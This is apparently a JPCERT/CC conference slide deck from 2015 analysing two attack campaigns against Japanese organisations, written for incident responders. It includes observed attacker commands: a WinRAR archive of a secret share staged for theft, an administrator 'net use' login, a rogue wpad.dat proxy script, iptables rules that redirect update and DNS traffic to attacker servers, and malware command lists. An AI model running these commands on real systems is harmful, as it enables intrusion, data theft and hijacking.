@@ -1,0 +1,2189 @@
+CODE BLUE 2015 
+
+Revealing the Attack Operations 
+Targeting Japan 
+
+JPCERT/CC 
+Analysis Center 
+ Shusei Tomonaga 
+ Yuu Nakamura 
+
+Agenda 
+
+１ 
+
+ Introduction 
+
+２ 
+
+ Operation A 
+
+３ 
+
+ Operation B 
+
+1 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Agenda 
+
+１ 
+
+ Introduction 
+
+２ 
+
+ Operation A 
+
+３ 
+
+ Operation B 
+
+2 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Self-introduction 
+
+Shusei Tomonaga 
+Yuu Nakamura 
+
+Analysis Center at JPCERT Coordination Center  
+Malware analysis, Forensics investigation 
+
+3 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+ 
+ 
+ 
+ 
+JPCERT Coordination Center 
+
+Japan Computer Emergency Response Team 
+Coordination Center 
+
+Prevention 
+• Vulnerability 
+
+information handling 
+
+Monitoring 
+• Information gathering 
+& analysis & sharing 
+• NW Traffic Monitoring 
+
+Response 
+• Incident handling 
+
+Early warning information 
+CSIRT establishment support 
+Industrial control system security 
+International collaboration 
+Artifact (e.g. Malware) analysis 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Targeted Attacks handled by JPCERT/CC 
+
+From April to September 2015 
+
+130 
+organizations 
+
+Operation A 
+
+93 organizations 
+93組織 
+
+Operation B 
+
+4組織 
+4 organizations 
+
+5 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+Introducing 2 Types of Attack Operations 
+
+Operation A 
+
+• Targeting many Japanese organizations since 
+
+around 2012. 
+
+• Emdivi 
+• CloudyOmega (Symantec) 
+• BLUE TERMITE (Kaspersky) 
+
+Operation B 
+
+• Targeting some Japanese organizations since 
+
+around 2013. 
+• APT17 (FireEye) 
+
+6 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Agenda 
+
+１ 
+
+ Introduction 
+
+２ 
+
+ Operation A 
+
+３ 
+
+ Operation B 
+
+7 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Characteristics of Operation A 
+
+Attacker’s Infrastructure（Compromised Web sites）
+
+Japan
+
+Overseas
+
+Victim organizations (Public offices, private companies)
+
+…
+
+Targeted emails
+
+Widespread emails
+
+Watering hole
+
+8 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Details of Internal Intrusion Techniques 
+
+Initial Compromise 
+
+Collecting Information 
+
+Lateral Movement     
+
+9 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Details of Internal Intrusion Techniques 
+
+Initial Compromise 
+
+Collecting Information 
+
+Lateral Movement 
+
+10 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Attack Patterns 
+
+Timeline of Attack Vector 
+
+2014/05 
+
+2014/09 
+
+2015/01 
+
+2015/05 
+
+2015/09 
+
+Disguised 
+Icon 
+
+Document 
+File 
+(Exploit 
+vulnerabilities) 
+
+Drive-By 
+Download 
+
+Medical expense, 
+Health insurance 
+
+2014/11 
+
+CVE-2014-7247 
+
+2015/07 
+
+CVE-2015-5119 
+CVE-2015-5122 
+
+In many attacks, malware are disguised with fake icons, compressed with 
+
+•
+  zip or lzh and attached to emails. 
+• Attacks aiming certain targets may lead to correspondence of emails. 
+
+11 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Details of Internal Intrusion Techniques 
+
+Initial Compromise 
+
+Collecting Information 
+
+Lateral Movement 
+
+12 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Investigation of Compromised Environment 
+
+Uses Legitimate tools provided by MS 
+
+Commands / Programs in OS standard accessories 
+
+• dir 
+• net 
+
+• net view 
+• net localgroup administrators 
+
+• ver 
+• ipconfig 
+• systeminfo 
+• wmic 
+
+Active Directory admin tools sent after the compromise 
+
+• csvde 
+• dsquery 
+
+13 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Example of Using dsquery 
+
+Used in some cases targeting specific individuals 
+
+14 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Collecting Email Account Information 
+
+Uses free tools (Similar to NirSoft Mail PassView) 
+Attempts to receive emails from outside 
+May lead to new attack emails (correspondence of emails) 
+    Infection spreading from organization to organization 
+
+15 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+Collecting Classified / Personal Information 
+
+Search Network Drive 
+
+Search Targeted Data 
+
+Create a Copy of Compressed 
+Files 
+
+Download 
+
+Delete Evidence 
+
+16 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Search Network Drive (1) 
+
+net use command 
+> net use 
+New connections will be remembered. 
+
+Status         Local  
+------------------------------------------------------------------------------- 
+OK  
+OK  
+
+¥¥FILESV01¥SECRET   Microsoft Windows Network 
+¥¥FILESV02¥SECRET   Microsoft Windows Network 
+
+               Network 
+
+     T: 
+     U: 
+
+Remote   
+
+wmic command 
+> wmic logicaldisk get caption,providername,drivetype,volumename 
+Caption   DriveType  
+3 
+C:  
+3  
+D:  
+4  
+T:  
+4  
+U:  
+
+¥¥FILESV01¥SECRET   Volume 
+¥¥FILESV01¥SECRET   Volume 
+
+ProviderName   VolumeName 
+
+OS 
+Volume 
+
+DriveType = 4 
+ ⇒ Network Drive 
+
+17 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Search Network Drive (2) 
+
+Combination of netstat Command & nbtstat Command 
+
+> netstat –an 
+
+TCP 192.168.xx.xx:49217 192.168.yy.yy:445 ESTABLISHED 
+
+>  nbtstat -a 192.168.yy.yy 
+Name  
+Status 
+--------------------------------------------- 
+FILESV01 <00> UNIQUE   Registered 
+
+            Type  
+
+Port 445 is set as the key 
+to search the access point 
+of file sharing service 
+
+18 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+Search Targeted Data 
+
+dir command 
+> dir ¥¥FILESV01¥SECRET  
+
+¥¥FILESV¥SECRET Directory 
+
+2014/07/11 09:16 [DIR] Management of Partner Companies 
+2014/09/04 11:49 [DIR] Management of Intellectual Property 
+2014/08/01 09:27 [DIR] Location information 
+
+Not only searches network drive but also compromised computers 
+
+> dir c:¥users¥hoge¥*.doc* /s /o-d 
+
+c:¥users¥hoge¥AppData¥Local¥Temp Directory 
+
+/s    : Displayed recursively 
+/o-d : Sorted by date 
+
+2014/07/29 10:19 28,672 20140820.doc 
+1 File 28,672 bytes 
+
+c:¥users¥hoge¥Important Information Directory 
+
+2015/08/29 10:03 1,214 Design Document.doc 
+
+19 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+ 
+ 
+ 
+ 
+Compress, Download, Delete Evidence  
+
+Compressed with RAR 
+
+> winrar.exe a –r –ed –v300m –ta20140101 %TEMP%¥a.rar 
+“¥¥FILESV01¥SECRET¥Management of Intellectual Property”  -n*.ppt* -n*.doc* -
+n*.xls* -n*.jtd 
+
+Adding ¥¥FILESV01¥SECRET¥Management of Intellectual Property¥Committee 
+List(2015.05.01).docx OK 
+Adding ¥¥FILESV01¥SECRET¥Management of Intellectual Property¥Framework.ppt 
+OK 
+Adding ¥¥FILESV01¥SECRET¥Management of Intellectual Property¥Application 
+List.xlsx OK 
+Adding ¥¥FILESV01¥SECRET¥Management of Intellectual Property¥Design 
+Document.jtd OK 
+・ 
+・ 
+
+Documents are compressed per folder 
+
+z 
+
+RAR files are sent to C&C servers and deleted 
+
+20 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+Details of Internal Intrusion Techniques 
+
+Initial Compromise 
+
+Collecting Information 
+
+Lateral Movement 
+
+21 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Methods Used to Spread Infection 
+
+Patterns of spreading infection 
+
+• Exploiting vulnerabilities (MS14-068 + 
+
+MS14-058) 
+
+• Investigating SYSVOL scripts 
+• Password list-based attack 
+• Exploiting Built-in Administrator 
+
+password 
+
+• Setting malware in file servers 
+• Exploiting WPAD 
+• Others 
+
+22 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Exploiting Vulnerabilities (MS14-068 + MS14-058)  
+
+1. Escalate privilege (MS14-058) and 
+dump user’s password with mimikatz 
+
+2. Exploit MS14-068 vulnerability and 
+gain Domain Admin privileges 
+
+PC-A 
+
+3. Upload mimikatz to DC and dump 
+admin’s passwords 
+
+Domain 
+Controller 
+
+4. Copy malware to PC-B 
+
+6. Malware executes 
+according to the task 
+
+5. Register a task in order to execute malware 
+
+PC-B 
+
+23 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+Investigating SYSVOL Scripts 
+
+Key Point 
+
+• In some cases, passwords are found in logon script, 
+
+etc. 
+
+Attacker’s 
+Infrastructure 
+
+Domain 
+Controller 
+
+1. Download logon script, 
+compress and archive 
+
+3. Search admin’s 
+password 
+
+6. Malware executes 
+according to the task 
+
+2. Download 
+
+4. Copy malware to 
+PC-B 
+
+C2 Server 
+
+PC-A 
+
+5. Register a task in order 
+to execute malware  
+
+PC-B 
+
+24 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Password List-based Attack 
+
+Key Point 
+
+• Attempts logon by using an approximately 10-30 line password 
+
+list and the user’s list of Domain Admins 
+• Uses a tool called logon.exe (self-built?)  
+
+1. Get user’s list of 
+Domain Admins 
+
+Domain 
+Controller 
+
+2. Attempts logon 
+with logon.exe 
+
+3. Copy malware  
+
+5. Execute 
+
+PC-A 
+
+25 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+4. Register a task  
+
+PC-B 
+
+Exploiting Built-in Administrator Password 
+
+Key Point 
+
+• An effective measure when there is no way to 
+
+exploit Domain environment 
+
+• Need to hash passwords or dump passwords 
+
+1. Escalate privilege (UAC bypass) 
+and dump user’s password 
+
+5. Execute 
+
+4. Register a task  
+
+3. Copy malware  
+
+PC-A 
+
+2. Pass the hash or net use 
+
+PC-B 
+
+net use ¥¥PC-B¥IPC$ [password]  /u:Administrator 
+
+26 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Setting Malware in File Servers 
+
+Key Point 
+
+• Effective when there is no other measure  
+
+1. Replace the existing file 
+with malware disguised with 
+fake icons 
+
+File Server 
+
+2. Execute 
+malware in file 
+servers 
+
+PC-A 
+
+PC-B 
+
+27 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Exploiting WPAD 
+
+WPAD (Web Proxy Auto-Discovery)  
+
+— Turned on by default 
+— Get automatic configuration script from either 
+
+   URL specified by DHCP server, or 
+   http://wpad/wpad.dat 
+
+28 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+ 
+ 
+Exploiting WPAD (Step 1: NetBIOS Spoofing) 
+
+Key Point 
+
+• Effective in an environment where WPAD is not 
+
+configured 
+
+• NetBIOS Spoofing 
+
+1. Broadcast: Name query NB WPAD 
+
+wpad.exe 
+
+PC-A 
+
+29 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+2. Name query response 
+   (I am WPAD) 
+
+PC-B 
+
+Exploiting WPAD (Step 2: Fake WPAD Server) 
+
+wpad.dat (automatic configuration script) 
+function FindProxyForURL(url, host) { 
+
+if (myIpAddress() != “[PC-A addr]”) { 
+
+return ‘PROXY wpad:8888;DIRECT’; 
+
+} 
+return ‘DIRECT’; 
+
+} 
+
+3. Request http://wpad/wpad.dat 
+
+4. Response 
+
+wpad.exe 
+
+PC-A 
+
+30 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+PC-B 
+
+ 
+ 
+ 
+ 
+ 
+ 
+Exploiting WPAD (Step 3: Man in the Middle 
+Proxy) 
+
+Web site 
+
+Attacker’s 
+Infrastructure 
+
+Attacker’s 
+Web Site 
+
+6. Drive-by download 
+attack 
+
+wpad.exe 
+
+5. Embed iframe in attacker’s 
+Web site 
+
+PC-A 
+
+31 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+PC-B 
+
+Summary: Methods of Spreading Infection 
+
+Method 
+
+AD 
+
+MS14-068 
+
+Necessary 
+
+Privilege 
+Escalation 
+Unnecessary / 
+Necessary for 
+password dump 
+
+Note 
+
+Risk exists when DC is 
+unpatched 
+
+SYSVOL Search 
+
+Necessary 
+
+Unnecessary 
+
+Brute Force Attack 
+(Password List 
+Attack) 
+
+Abusing Built-in 
+Administrator 
+
+Exploiting File 
+Servers 
+
+Necessary 
+
+Unnecessary 
+
+Unnecessary 
+
+Necessary 
+
+Unnecessary 
+
+Unnecessary 
+
+Risk exists when the 
+password is weak 
+
+Presumes that the 
+password is the same 
+
+Risk exists when the 
+file is disguised to one 
+that many users open 
+
+Exploiting WPAD 
+
+Unnecessary 
+
+Unnecessary  Situations are limited 
+
+32 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+DETAILS OF TOOLS AND 
+MALWARE 
+
+33 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Characteristics of Malware 
+Different types of malware reside depending on the 
+phase and scale of damage of the attack 
+
+Malware 
+
+Overview 
+
+File 
+format 
+
+Form of attack 
+
+Emdivi (t17) 
+
+HTTP BOT 
+
+EXE 
+
+Intrude 
+
+Tools 
+
+usp10jpg 
+
+Emdivi (t19, 
+t20) 
+
+BeginX 
+
+GStatus 
+
+Password dump, etc.  EXE, etc. 
+Download (low-
+frequency 
+communication) 
+
+DLL, 
+data 
+
+HTTP BOT (highly 
+sophisticated than 
+t17) 
+
+Remote shell tool 
+
+HTTP BOT (low-
+frequency 
+communication) 
+
+Lateral Movement 
+
+EXE 
+
+EXE 
+
+EXE,DLL  Conceal? 
+
+Reference : [Ayaka Funakoshi. A study on malware characteristics and its effects observed in targeted attacks. MWS, 2015] 
+
+34 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Tools 
+Type 
+
+Password dump 
+Pass-the-hash 
+
+Vulnerability 
+exploitation 
+
+Overview 
+
+Filename 
+
+Quarks PwDump 
+
+MimikatzLite 
+
+qp.exe, qd.exe, QDump.exe, etc. 
+
+gp.exe 
+
+Windows credentials Editor 
+
+wce.exe, ww.exe 
+
+Mimikatz 
+
+MS14-068  
+(CVE-2014-6324) 
+
+mz.exe, mimikatz.exe, mimikatz.rar 
+(sekurlsa.dll) 
+
+ms14-068.exe 
+ms14-068.tar.gz 
+
+MS14-058 (Privilege escalation) 
+(CVE-2014-4113) 
+
+4113.exe 
+
+UAC bypass 
+
+UAC bypass tool 
+
+msdart.exe, puac.exe, etc. 
+
+Packet transmit 
+
+Htran, proxy adaptive Htran 
+
+htproxy.exe, etc. 
+
+Mail account theft  Similar to NirSoft Mail PassView 
+
+CallMail.exe, outl.exe , etc. 
+
+Utility 
+
+Attempt logon based on list 
+
+logon.exe 
+
+WinRAR archiver 
+
+yrar.exe, rar,exe, etc. 
+
+Highly sophisticated dir command  dirasd.exe, etc. 
+
+Change timestamp 
+
+timestomp.exe 
+
+35 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Emdivi (t17) 
+
+HTTP BOT with basic functions 
+
+Repeatedly upgraded the version in the past year and 
+implemented new commands 
+
+Command 
+
+DOABORT 
+
+DOWNBG 
+
+GETFILE 
+
+LOADDLL 
+
+SETCMD 
+
+SUSPEND 
+
+UPLOAD 
+
+VERSION 
+
+GOTO 
+
+CLEARLOGS 
+
+36 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Date of Implementation 
+
+May 2015 
+
+August 2015 
+
+ 
+ 
+Emdivi (t20) 
+
+Highly Sophisticated Emdivi 
+
+The number of implemented commands have increased 
+and decreased in the past year. 
+— 18-41 (based on JPCERT/CC’s study) 
+
+In some cases, the targeted organization’s proxy server 
+address is hard-coded. 
+
+May only run on specific computers (encryption of data 
+by computer SID) 
+
+37 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+ 
+ 
+usp10jpg 
+
+Download (low-frequency communication) 
+
+Communication performed once a day 
+Able to specify the day of week of communication 
+Tend to be set to computers that are not infected with 
+Emdivi (secondary infection) 
+DLL Preloading Attack 
+
+Exploit specific DLL 
+Search Order and 
+load malicious DLL 
+
+Read data 
+and execute 
+
+Application 
+
+38 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+dwmapi.dll, etc. 
+
+***.DAT 
+
+ 
+ 
+ 
+Difficulty to detect Usp10jpg 
+
+Computer 
+Infected 
+with Emdivi 
+
+Easy to detect due to 
+high-frequency 
+communication 
+
+Attacker’s 
+Infrastructure 
+
+usp10jpg 
+
+May be left undetected due to 
+low-frequency communication 
+
+39 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+BeginX 
+
+Remote Shell Tool 
+
+BeginX Server  
+— Listens to specific ports and waits for commands 
+— Both UDP and TCP versions available 
+
+BeginX Client 
+— Client which sends commands to BeginX Server 
+— Controlled via Emdivi 
+
+40 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+Image of Using BeginX 
+
+Segment 
+(unable to 
+connect to 
+Internet) 
+
+Unable to control by 
+Emdivi infection 
+
+Attacker’s 
+Infrastructure 
+
+BeginX 
+Server 
+
+BeginX 
+Client 
+
+Emdivi 
+
+Computer 
+Infected 
+with Emdivi 
+
+41 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Able to control via BeginX 
+
+GStatus 
+
+HTTP BOT different from Emdivi 
+
+Not found in many organizations, but... 
+
+Bot Function 
+— Get drive information 
+— Execute arbitrary shell command 
+— Process list 
+— Screen related functions 
+
+42 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+ 
+GStatus Web Panel (Admin Screen) 
+
+43 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ANALYSIS TOOLS 
+
+emdivi_string_decryptor.py 
+
+44 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+emdivi_string_decryptor.py 
+
+emdivi_string_decryptor.py 
+
+• IDAPython 
+• Used to analyze Emdivi 
+• Decode encoded strings 
+
+Supported version 
+
+• t17, 19, 20 
+
+45 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+emdivi_string_decryptor.py 
+
+Emdivi encoded strings 
+
+46 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+emdivi_string_decryptor.py 
+
+Difference depending on version string 
+
+Ver 17 
+
+Ver 19 or 20 
+
+Ver 20 
+
+Encrypt  XxTEA encrypt 
+
+XxTEA decrypt 
+
+AES decrypt 
+
+Decrypt  XxTEA decrypt 
+
+XxTEA encrypt 
+
+AES encrypt 
+
+Key 
+
+MD5( 
+    MD5(base64(ver)) 
+    + 
+    MD5(key_string) 
+) 
+
+Scanf( 
+    "%x", 
+    Inc_Add( 
+        ver17_key 
+    ) 
+) 
+
+Inc_Add( 
+    ver17_key 
+) 
+
+47 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+emdivi_string_decryptor.py 
+
+48 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+emdivi_string_decryptor.py 
+
+49 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+DEMO 
+
+50 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+Agenda 
+
+１ 
+
+ Introduction 
+
+２ 
+
+ Operation A 
+
+３ 
+
+ Operation B 
+
+51 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Attack Techniques 
+
+Drive-by Download Attack 
+
+Update Hijacking 
+
+Domain Name Hijacking 
+
+52 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Attack Techniques 
+
+Drive-by Download Attack 
+
+Update Hijacking 
+
+Domain Name Hijacking 
+
+53 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Drive-by Download (Watering Hole) Attack 
+
+Targeted 
+Organization 
+
+0. Deface Web site 
+
+Japanese 
+Web server 
+
+1. Access to Web site 
+
+２. Redirect 
+
+Attacker’s 
+Server 
+
+４. Malware 
+Infection 
+
+３. Download malware 
+
+54 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Access Control 
+
+.htaccess 
+
+55 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Target name 
+
+IP address 
+
+0-day Exploits 
+
+CVE-2013-3893 (MS13-080) 
+
+• Detected around  September 2013 
+• Vulnerability in Internet Explorer 
+
+CVE-2013-3918 (MS13-090) 
+
+• Detected around  October 2013 
+• Vulnerability in Internet Explorer 
+
+CVE-2014-0324 (MS14-012) 
+
+• Detected around   February 2014 
+• Vulnerability in Internet Explorer 
+
+56 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Attack Techniques 
+
+Drive-by Download Attack 
+
+Update Hijacking 
+
+Domain Name Hijacking 
+
+57 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Update Hijacking 
+
+Method used to alter updated information 
+
+Targeted 
+Organization 
+
+0. Alter updated information 
+
+Update 
+Server 
+
+1. Request to update 
+
+２. Fake update Information 
+
+３. Request to download 
+
+Fake Update 
+Server 
+
+５. Malware 
+Infection 
+
+４. Download malware 
+
+58 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Another Update Hijacking Pattern 
+
+Method used without changing update server's file 
+
+Targeted 
+Organization 
+
+0. Change iptables 
+
+1. Software Update 
+
+Update 
+Server 
+
+Fake Update 
+Server 
+
+59 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Another Update Hijacking Pattern 
+
+Method used without changing update server's file 
+
+TCP 80 is forwarded by iptables. 
+
+iptables -t nat -A PREROUTING -i eth0  -s aa.bb.cc.dd -p 
+tcp --dport 80 -j DNAT --to-destination ww.xx.yy.zz:53 
+
+Key Point 
+
+• Update server's file is unchanged 
+• Does not save iptables 
+• Targeted organization sees as if it is 
+
+communicating with legitimate update server 
+
+60 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Attack Techniques 
+
+Drive-by Download Attack 
+
+Update Hijacking 
+
+Domain Name Hijacking 
+
+61 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Domain Name Hijacking 
+
+0. Change registration information 
+
+Legitimate 
+Server 
+
+DNS 
+Server 
+
+Web 
+Server 
+
+Registrar 
+
+Registry 
+
+1.DNS query 
+
+Targeted 
+Organization 
+
+.com 
+DNS Server 
+Attacker’s 
+Infrastructure 
+
+DNS 
+Server 
+
+Web 
+Server 
+
+2.DNS query 
+
+4.Web access 
+
+62 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+DETAILS OF MALWARE 
+
+63 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Domain Name Hijacking 
+
+Routing of only specific DNS queries by using iptables 
+
+iptables -t nat -A PREROUTING -p udp --dport 53 -m string 
+--from 30 --to 34 --hex-string "|03|AAA" --algo bm -j DNAT --
+to-destination aa.bb.cc.dd:54 
+
+iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT -
+-to ww.xx.yy.zz:53 
+
+Key Point 
+
+AAA.example.com 
+
+• Routing of only specific sub domains 
+• Other DNS queries are routed to the 
+
+legitimate DNS server 
+
+64 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+Characteristics of Malware 
+
+① Uses a different malware before and after 
+
+the intrusion 
+
+② Some malware run in memory only 
+
+③ Embedding target  organization's internal 
+
+information 
+
+④ Uses code signing certificate in some cases 
+
+65 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+ 
+ 
+Characteristics of Malware 
+
+ Intrusion 
+
+BlackCoffee 
+
+McRAT 
+
+Preshin 
+
+Agtid 
+
+Concealing 
+
+Hikit 
+
+Derusbi  PlugX 
+
+66 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Malware (Intrusion) 
+
+BlackCoffee 
+
+McRAT 
+
+Preshin 
+
+Agtid 
+
+HTTP bot with basic functions 
+
+info 
+
+Command List 
+command 
+0x184004  Execute remote shell 
+0x184008  Run remote shell command 
+0x18400c 
+0x184010 
+0x184014  Get drive information 
+0x184018 
+0x18401c 
+0x184020 
+
+Create directory 
+Search file 
+Delete file 
+
+Create file 
+Load file 
+
+67 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+command 
+0x184024 
+0x184028 
+0x18402c 
+0x184030 
+0x184034 
+0x184038 
+0x18403c 
+
+info 
+Move file 
+Process list 
+Terminate process 
+Sleep 
+Install command 
+Set Sleep Time 
+Terminate 
+
+IP Address Acquisition Algorithm 
+
+Get C2 IP address from Web page 
+
+start: @MICR0S0FT 
+end: C0RP0RATI0N 
+
+start: lOve yOu 4 eveR 
+end: Reve 4 uOy evOl 
+
+Decode 
+
+68 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Malware (Intrusion) 
+
+BlackCoffee 
+
+McRAT 
+
+Preshin 
+
+Agtid 
+
+Plug-in-based malware 
+
+Command list 
+
+command number 
+0 
+1 
+3 
+4 
+5 
+6 
+7 
+8 
+9 
+
+info 
+Send data to server 
+Set TickCount 
+Plug-in registration 
+Allocate Plug-in settings area 
+Set Plug-in settings area 
+Create/Execute plug-in 
+Terminate plug-in 
+Create configuration file 
+- 
+
+69 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Malware Running in Memory Only 
+
+CVE-2013-3918 with McRAT 
+
+ROP 
+
+Shellcode 
+
+skip 
+
+Malware 
+
+70 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Malware Running in Memory Only 
+
+CVE-2013-3918 with McRAT 
+
+Executes rundll32.exe and 
+injects code 
+
+McRAT's data below 
+Shellcode is injected 
+
+Not saved as a file 
+
+71 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+ 
+Malware (Intrusion) 
+
+BlackCoffee 
+
+McRAT 
+
+Preshin 
+
+Agtid 
+
+Simple HTTP bot with limited functions 
+
+Command list 
+
+command 
+
+info 
+
+ downonly 
+
+ downexec 
+
+ - 
+
+Download file 
+
+Download and Execute file 
+
+Run remote shell command 
+
+72 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Preshin Controller 
+
+PHP-based Controller 
+
+73 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Preshin Controller 
+
+Example of command execution 
+
+74 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Malware (Intrusion) 
+
+BlackCoffee 
+
+McRAT 
+
+Preshin 
+
+Agtid 
+
+HTTP bot with basic functions 
+
+Command list 
+
+command 
+1 
+2 
+3 
+4 
+5 
+7 
+
+info 
+Get disk information 
+File list 
+Open file 
+Upload file 
+Create file 
+Load file 
+
+command 
+8 
+9 
+10 
+11 
+12 
+13 
+
+info 
+- 
+Delete file 
+Delete file/folder 
+Upload file 
+Create folder 
+Move file 
+
+75 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Malware (Concealing) 
+
+Hikit 
+
+Derusbi  PlugX 
+
+Malware with Rootkit functions 
+
+Command list 
+
+command 
+ file 
+ information  Send configuration information 
+
+info 
+File related operation 
+
+ proxy 
+
+ connect 
+
+Enable Proxy settings 
+
+Connect to Hikit proxy 
+
+ shell 
+
+Run remote shell command 
+
+ socks5 
+
+Enable Proxy settings (socks5) 
+
+ exit 
+
+Terminate 
+
+76 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Hikit Configuration Information 
+
+Hikit has proxy information of the internal network 
+
+ID 
+Target name 
+
+Proxy info 
+
+Rootkit setting 
+
+77 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Malware (Concealing) 
+
+Hikit 
+
+Derusbi  PlugX 
+
+Malware recently often used 
+
+Command list 
+
+command 
+
+ cmd4 
+
+ cmd5 
+
+ cmd6 
+
+ cmd7 
+
+ cmd8 
+
+ cmd9 
+
+info 
+Service/Process related 
+operation 
+Run remote shell command 
+
+Connect to Derusbi proxy 
+
+File operation 
+
+Terminate 
+
+Create/Delete file 
+
+78 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Derusbi Configuration Information 
+
+Derusbi has proxy information of the internal network 
+
+ID 
+
+Proxy info 
+
+79 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Code Signing Certificate 
+
+Identity 
+
+Type 
+
+Country 
+
+ System Integrator 
+
+ Software Vendor 
+
+ Software Vendor 
+
+  Automaker 
+
+ Heavy Industry 
+
+ Software Vendor 
+
+ Electronics Industry 
+
+ Software Vendor 
+
+80 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+exe 
+
+exe 
+
+exe 
+
+exe 
+
+jar 
+
+exe 
+
+jar 
+
+exe 
+
+Japan 
+
+Japan 
+
+Korea 
+
+Korea 
+
+Korea 
+
+Korea 
+
+Korea 
+
+Korea 
+
+Infrastructure Used by Attackers 
+
+Japan 
+
+Web Server 
+
+Backdoor 
+
+Targeted 
+Organization 
+
+Attacker’s 
+Server 
+
+C2 Server 
+
+iptables 
+
+Overseas 
+Server 
+
+81 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Linux Backdoor 
+
+mod_rootme 
+
+• apache module 
+• Runs a remote shell by sending a keyword 
+
+mod_rootme source 
+
+Keyword 
+“Roronoa” 
+
+82 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Linux Backdoor 
+
+rs_linux 
+
+• Highly sophisticated Linux bot 
+
+MyNetstat 
+PortTunnelGet 
+PortTunnel_RemoteClose 
+PortTunnel_Show 
+CreatePortTunnel 
+PortForward 
+PortForward_Show 
+PortForward_Close 
+
+Function 
+CreateShell 
+GetFileSource 
+MyPs 
+KillByPid 
+NewConnectTo 
+StartPutFile 
+PutFileDest 
+ShellServer 
+
+Mymkdir 
+Mymkfile 
+Myrmfile 
+Myrmdir 
+ListDir 
+my_reboot 
+ShowHide 
+SwitchHide 
+
+83 
+
